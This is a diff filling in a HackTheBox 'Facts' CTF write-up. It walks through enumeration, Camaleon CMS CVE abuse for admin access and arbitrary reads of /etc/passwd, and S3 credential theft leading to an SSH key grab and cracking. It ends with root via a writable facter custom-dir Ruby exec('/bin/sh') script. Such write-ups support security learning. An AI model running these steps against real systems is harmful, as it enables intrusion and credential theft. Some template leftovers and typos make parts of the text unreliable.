@@ -322,7 +322,9 @@ description: "HackTheBox writeup for the Facts machine by Costabo1"
   <div class="cell"><div class="label">Status</div><div class="value">Retired</div></div>
   <div class="cell"><div class="label">Author</div><div class="value">Costabo1</div></div>
 </div>
+
 The objective of this machine is to gain initial access through a vulnerable web application, escalate privileges via cloud misconfiguration (AWS S3), and ultimately achieve root access through a Linux privilege escalation vector.
+
 <span class="icon">🔭</span> Overview
 
 Facts is an easy-difficulty machine demonstrating a full attack chain:
@@ -341,7 +343,7 @@ Privilege escalation is achieved by abusing a misconfigured `sudo` rule involvin
 <!-- Difficulty visual -->
 <div class="diff-bar">
   <div class="track"><div class="fill" style="width:30%"></div></div>
-  <div class="label">Difficulty feel: Easy–Medium</div>
+  <div class="label">Difficulty feel: Easy</div>
 </div>
 <span class="icon">🛠️</span> Tools Used
 <ul class="tool-list">
@@ -356,8 +358,9 @@ Privilege escalation is achieved by abusing a misconfigured `sudo` rule involvin
 
 <span class="icon">🔍</span> Enumeration
 Port Scan
-bashnmap -sC -sV -oN facts.nmap 10.10.xx.xx
-
+```bash
+nmap -sC -sV -oN facts.nmap 10.10.35.249
+```
 # Paste your nmap output here
 Nmap scan report for 10.129.35.249
 Host is up (0.050s latency).
@@ -372,90 +375,180 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.26.3 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Describe what you found on the web service — directories, interesting endpoints, technologies, etc.
+Subdirectories enumeration
+```bash
+gobuster dir -u http://10.129.35.24 -w /usr/share/wordlists/dirb/common.txt
+```
 
-bashgobuster dir -u http://10.129.35.24 -w /usr/share/wordlists/dirb/common.txt
-<div class="callout info">
-  <span class="callout-icon">ℹ️</span>
-  <div class="callout-body">
-    <strong>Note</strong>
-    Replace placeholder IPs and commands with your actual findings as you document each section.
-  </div>
-</div>
+Discovered endpoints:
 
-<span class="icon">⚡</span> Initial Foothold
-Vulnerability / Entry Point
+ /admin/login
+ /admin/register
+In /admin/register, I was able to create an new user and login.
 
-Explain what vulnerability or misconfiguration you found and how you exploited it to get your first shell.
+A user account was created:
 
-bash# Example: your exploit command
-python3 exploit.py http://10.10.xx.xx
+* **Username:** `mew1222`
+* **Password:** `mew121212`
+I noticed the web app is running Camaleon CMS 2.9.0 and after some research.The application was vulnerable to CVE-2025-2304 
+I can ultize it to gain admin privelege from my new register user.
+
+
+☁️ AWS S3 Exploitation
+
+In the admin pannel, you can use there is AWS S3 keys
+
+### 🔐 Retrieved Credentials
+
+* **Access Key:** `AKIAD337D13639BD95BE`
+* **Secret Key:** `v9WTmIuNeeq4L5s72WobV6CQs6HIJVkrq7NdRpZb`
+* **Region:** `us-east-1`
+* **Buckets:** `http://facts.htb:54321`
+
+Runing the aws cli command discovered two directorties, and internal contains an ssh id key
+```bash
+aws --endpoint-url http://facts.htb:54321 s3 ls      
+```
+internal
+randomfacts
+```bash
+ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .   
+```
 <div class="callout warn">
   <span class="callout-icon">⚠️</span>
   <div class="callout-body">
     <strong>Pitfall</strong>
     Note any common mistakes or things that tripped you up — this is useful for readers hitting the same wall.
   </div>
-</div>
-Shell Upgrade
-bashpython3 -c 'import pty;pty.spawn("/bin/bash")'
-export TERM=xterm
-# Ctrl+Z  →  stty raw -echo; fg
 
-<span class="icon">📈</span> Privilege Escalation
-Enumeration on Host
-bash# Run linpeas or manual checks
-./linpeas.sh 2>/dev/null | tee linpeas.out
-Exploitation Path
+CVE-2024-46987 - Camaleon CMS Authenticated Arbitrary File Read</h1></body></html>
 
-Describe each step of the privesc chain clearly. One sub-heading per distinct technique (SUID, sudo, cron, weak file perms, etc.)
 
-Step name here
-bash# Command that achieves this step
-<ol class="steps">
-  <li>Identify the misconfigured binary / cron / permission</li>
-  <li>Craft your payload or abuse the primitive</li>
-  <li>Trigger execution and catch the escalated shell</li>
-</ol>
-<div class="callout danger">
-  <span class="callout-icon">🔴</span>
-  <div class="callout-body">
-    <strong>Security Issue</strong>
-    Summarise why this vulnerability exists and what would fix it in a real environment.
-  </div>
-</div>
+```bash
+python adminpan.py -u http://facts.htb -l mew1222 -p mew121212 /etc/passwd           
+```
 
-<span class="icon">🚩</span> Flags
+Running this python payload from CVE-2024-46987 with the user account that have admin previlege reveal the backend web server's users
+
+ss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
+william:x:1001:1001::/home/william:/bin/bash
+_laurel:x:101:988::/var/log/laurel:/bin/false
+
+With ssh John to crack the id_ed25519 password, it revealed the password is d******z
+And the id_ed25519 is belongs to the userL trivia
+
+```bash
+sh -i id_ed25519 trivia@facts.htb
+```
+
+trivia@facts:~$ pwd  
+/home/trivia
+
+The user's flag was in william's directory
+trivia@facts:~$ cat /home/william/flag.txt
+cat: /home/william/flag.txt: No such file or directory
+trivia@facts:~$ cat /home/william/user.txt
+
+
 User Flag
 <div class="flag-block">
   <span class="flag-icon">🏴</span>
   <span class="flag-label">user.txt</span>
-  <span class="flag-value">REDACTED — claim your own 🙂</span>
+  <span class="flag-value">flag:f36************* 🙂</span>
 </div>
-bashcat /home/username/user.txt
+
+
+
+
+
+
+
+<span class="icon">📈</span> Privilege Escalation
+Enumeration on Host
+```bash
+sudo -l
+```
+Sudo permission discovered:
+
+```bash
+sudo /usr/bin/facter --custom-dir /tmp
+```
+
+### Vulnerability
+
+* `facter` loads Ruby scripts from a user-writable directory
+* This allows arbitrary code execution as root
+```bash
+echo 'exec("/bin/sh")' > /tmp/x.rb
+```
+trivia@facts:/tmp$ cat x.rb
+exec("/bin/sh")
+
+Then I run the ruby's script with /usr/bin/facter
+```bash
+sudo /usr/bin/facter --custom-dir /tmp
+```
+
+We obtained the root's shell 
+# whoami
+root
+# cd /root
+# ls
+minio-binaries	ministack  root.txt  snap
+
+
+ 
+
+
+## 💥 Privilege Escalation Flow
+
+<div class="mermaid">
+flowchart TD
+    A[User: trivia] --> B[sudo facter --custom-dir /tmp]
+    B --> C[Writable /tmp directory]
+    C --> D[Drop malicious Ruby script]
+    D --> E[facter executes script]
+    E --> F[exec '/bin/sh']
+    F --> G[Root Shell]
+</div>
+
+<span class="icon">🚩</span> Flags
+
+
 Root Flag
 <div class="flag-block">
   <span class="flag-icon">🏁</span>
   <span class="flag-label">root.txt</span>
-  <span class="flag-value">REDACTED — claim your own 🙂</span>
-</div>
-bashcat /root/root.txt
-<div class="callout win">
-  <span class="callout-icon">✅</span>
-  <div class="callout-body">
-    <strong>Pwned!</strong>
-    Both flags captured. Machine complete.
-  </div>
-</div>
+  <span class="flag-value">flag:eda2a********** 🙂</span>
+
+
+Both flags captured. Machine complete.
+
 
 <span class="icon">📝</span> Key Takeaways
 
-Lesson 1 — What this box taught you about enumeration or exploitation.
-Lesson 2 — A tool or technique you'll carry forward.
-Lesson 3 — What you'd do differently next time.
+* Mass assignment vulnerabilities can directly lead to privilege escalation
+* File read vulnerabilities often expose cloud credentials
+* S3 misconfigurations remain a critical real-world risk
+* Writable plugin/script directories in sudo contexts are extremely dangerous
+* Full compromise was achieved through chaining multiple small flaws
 
 
-<span class="icon">🔗</span> References
+<span class="icon">🔗</span> Final thoughts
+
+
+This machine demonstrates a realistic enterprise attack chain:
+
+* Web application misconfiguration
+* Cloud credential leakage
+* Object storage abuse
+* Linux privilege escalation via unsafe sudo tooling
+
+Each vulnerability alone was minor, but combined they resulted in full system compromise.
 
 HTB – Facts machine page
 OWASP – Relevant vuln class
